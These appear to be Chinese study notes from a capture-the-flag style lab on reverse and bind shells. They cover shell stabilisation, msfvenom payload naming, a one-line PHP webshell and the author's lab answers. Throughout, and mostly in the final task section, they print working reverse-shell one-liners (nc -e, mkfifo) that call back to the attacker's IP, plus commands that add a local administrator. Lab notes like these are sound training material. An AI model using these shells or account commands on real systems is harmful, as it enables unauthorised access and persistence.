# nc shell 穩定
默認情況下，這些 shell 非常不穩定。按 Ctrl + C 殺死整個事情。它們是非交互式的，並且經常出現奇怪的格式錯誤。這是因為 netcat “shell”實際上是在終端內運行的進程，而不是本身就是真正的終端。
## 1. python
```
第一步:python -c 'import pty;pty.spawn("/bin/bash")'

第二步是：export TERM=xterm——這將使我們能夠訪問術語命令

最後（也是最重要的）我們將使用 Ctrl + Z 將 shell 設置為背景。回到我們自己的終端，使用 stty raw -echo; fg 這做了兩件事：首先，它關閉了我們自己的終端回顯（這使我們可以訪問選項卡自動完成、箭頭鍵和 Ctrl + C 來終止進程）。然後它將 shell 置於前台
```
請注意，如果 shell 死機，您自己的終端中的任何輸入都將不可見（由於禁用了終端回顯）。要解決此問題，請鍵入`reset`並按 Enter。

## 2.rlwrap
rlwrap 是一個程序，簡單來說，它可以讓我們在收到 shell 後立即訪問歷史記錄、選項卡自動完成和箭頭鍵
```
rlwrap nc -lvnp <port>
```
這種技術在處理 Windows shell 時特別有用

## socat

## msfvenom
`msfvenom -p <PAYLOAD> <OPTIONS>`
-f <格式>
指定輸出格式。在這種情況下，這是一個可執行文件 (exe)
-o <文件>
生成的有效負載的輸出位置和文件名。

```
使用 msfvenom 時，了解命名系統的工作原理很重要。基本約定如下：

<OS>/<arch>/<payload>

例如：

linux/x86/shell_reverse_tcp

這將為 x86 Linux目標生成無階段反向 shell。

此約定的例外是 Windows 32 位目標。對於這些，沒有指定arch。例如：

windows/shell_reverse_tcp


對於 64 位 Windows 目標，arch 將被指定為普通 (x64)。


```

上面的示例中，使用的有效負載是shell_reverse_tcp. 這表明它是一個無階段的有效載荷。因為無階段有效載荷用下劃線 ( _) 表示。與此有效負載等效的分階段將是：
shell/reverse_tcp

分階段的有效載荷用另一個正斜杠 ( /) 表示。

此規則也適用於 Meterpreter 有效負載。Windows 64 位分段 Meterpreter 有效負載如下所示：

windows/x64/meterpreter/reverse_tcp

Linux 32 位無階段 Meterpreter 有效負載如下所示：

linux/x86/meterpreter_reverse_tcp
```
分階段的反向 shell 有效負載和無階段的反向 shell 有效負載。

分階段的有效負載分兩部分發送。第一部分稱為stager。這是一段直接在服務器本身上執行的代碼。它連接回等待的偵聽器，但它本身實際上並不包含任何反向 shell 代碼。相反，它連接到偵聽器並使用連接來加載真正的有效負載，直接執行它並防止它接觸可能被傳統反病毒解決方案捕獲的磁盤。因此，有效負載分為兩部分——一個小的初始階段，然後是在階段啟動時下載的更大的反向 shell 代碼。分階段的有效負載需要一個特殊的監聽器——通常是 Metasploit 多/處理程序，將在下一個任務中介紹。
無階段有效載荷更常見——這些是我們迄今為止一直在使用的。它們是完全獨立的，因為有一段代碼在執行時會立即將 shell 發送回等待的偵聽器。
無級有效載荷往往更易於使用和捕獲；但是，它們也更龐大，並且更容易被防病毒或入侵檢測程序發現和刪除。分階段的有效載荷更難使用，但初始階段要短得多，有時會被效率較低的防病毒軟件遺漏。現代防病毒解決方案還將利用反惡意軟件掃描接口 (AMSI) 來檢測負載，因為它由 stager 加載到內存中，從而使分階段的負載不如以前在該區域中的有效。
```

## webshell
“Webshel​​l”是一個通俗的術語，用於在網絡服務器（通常使用PHP或 ASP 等語言）中運行的腳本，該腳本在服務器上執行代碼。本質上，命令被輸入到網頁中——通過 HTML 表單，或者直接作為 URL 中的參數——然後由腳本執行，結果返回並寫入頁面。如果有防火牆，這將非常有用，或者甚至只是作為進入完全成熟的反向或綁定外殼的墊腳石。

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

這將在 URL 中獲取一個 GET 參數，並在系統上使用shell_exec(). 本質上，這意味著我們在 URL 中輸入的任何命令都?cmd=將在系統上執行——無論是 Windows 還是Linux。“pre”元素是為了確保結果在頁面上的格式正確。  

認情況下 Kali 上有多種 webshell 可用/usr/share/webshells   

多數通用的、特定於語言的（例如 PHP）反向 shell 是`為基於 Unix 的目標`（例如 Linux 網絡服務器）編寫的。`默認情況下，它們無法在 Windows 上運行。`   
   
`目標是 Windows 時`，通常最容易使用 web shell 獲取 RCE，或者使用 msfvenom 生成服務器語言的反向/綁定 shell。使用前一種方法，通常使用 URL 編碼的 `Powershell Reverse Shell` 來獲取 RCE。這將作為cmd參數複製到 URL 中


## 好的，我們有一個外殼。怎麼辦？
許多生成、發送和接收 shell 的方法。這些都有一個共同點，那就是它們往往是不穩定的和非交互的。即使是更容易穩定的 Unix 風格的 shell 也不理想。那麼，我們能做些什麼呢？
`Linux`
```
理想情況下，在Linux 上，我們會尋找機會訪問用戶帳戶。存儲在 的 SSH 密鑰/home/<user>/.ssh通常是執行此操作的理想方式。在 CTF 中，在盒子的某處發現憑證也不少見。一些漏洞還允許您添加自己的帳戶。特別是像Dirty C0w或可寫的 /etc/shadow 或 /etc/passwd 這樣的東西會很快讓你通過 SSH 訪問機器，假設 SSH 是打開的。
```
`windows`
```
Windows 上，選項通常更加有限。有時可以在註冊表中找到運行服務的密碼。例如，VNC 服務器經常將密碼以明文形式存儲在註冊表中。某些版本的 FileZilla FTP服務器還會在 XML 文件中的C:\Program Files\FileZilla Server\FileZilla Server.xml
 或C:\xampp\FileZilla Server\FileZilla Server.xml
```
 這些可以是 MD5 散列或純文本，具體取決於版本
 ```
 理想情況下，在 Windows 上，您將獲得以 SYSTEM 用戶身份運行的 shell，或以高權限運行的管理員帳戶。在這種情況下，可以簡單地將您自己的帳戶（在管理員組中）添加到計算機，然後通過 RDP、telnet、winexe、psexec、WinRM 或任何數量的其他方法登錄，具體取決於機器上運行的服務.

其語法如下：

net user <username> <password> /add

net localgroup administrators <username> /add
 ```

 理想情況下，我們總是希望升級為使用“正常”方法來訪問機器，因為這總是更容易用於進一步利用目標。















# task 13
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```
## 嘗試將 webshell 上傳到Linux機器，然後使用命令：nc <LOCAL-IP> <PORT> -e /bin/bash將反向 shell 發送回您自己機器上的等待偵聽器。

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
```
上傳了一個webshell 

然後 http://10.10.195.47/uploads/webshell.php?cmd=nc -e /bin/sh 10.9.2.107 8888

payload = nc -e /bin/sh {kali ip} 8888

kali上 nc -nvlp 8888
```
## 導航到/usr/share/webshells/php/php-reverse-shell.phpKali 並更改 IP 和端口以將您的 tun0 IP 與自定義端口匹配。設置 netcat 監聽器，然後上傳並激活 shell。
```
上傳了php-reverse-shell.php
kali上 nc -nvlp 9999
```
## 使用任務 14 中的憑據通過 SSH登錄Linux機器。使用任務 8 中的技術來試驗綁定和反向 netcat shell。
```
kali : nv -nvlp 8888
mkfifo /tmp/f; nc 10.9.2.107 8888 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
```
shell@linux-shell-practice:~$ mkfifo /tmp/f; nc -lvnp 8888 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

┌──(kali㉿kali)-[~]
└─$ nc 10.10.195.47 8888                                                         1 ⨯
whoami
shell
```

在Linux機器上使用 Socat 練習反向和綁定 shell 。嘗試常規和特殊技術。

無需回答
查看所有的 Payloads並嘗試其他一些反向 shell 技術。嘗試分析它們，看看它們為什麼起作用。

無需回答
切換到 Windows虛擬機。嘗試上傳並激活php-reverse-shell. 這行得通嗎？

無需回答
在 Windows 目標上上傳 webshel​​l 並嘗試使用 Powershell 獲取反向 shell。

無需回答
網絡服務器以 SYSTEM 權限運行。創建一個新用戶並將其添加到“管理員”組，然後通過 RDP 或 WinRM 登錄。

無需回答
嘗試使用 socat 和 netcat 在 Windows 目標上獲取反向和綁定 shell。

無需回答
使用 msfvenom 創建一個 64 位 Windows Meterpreter shell 並將其上傳到 Windows Target。激活 shell 並使用 multi/handler 捕獲它。試用此 shell 的功能。

無需回答
為任一目標創建分階段和無階段的meterpreter shell。上傳並手動激活它們，用netcat捕獲 shell——這行得通嗎？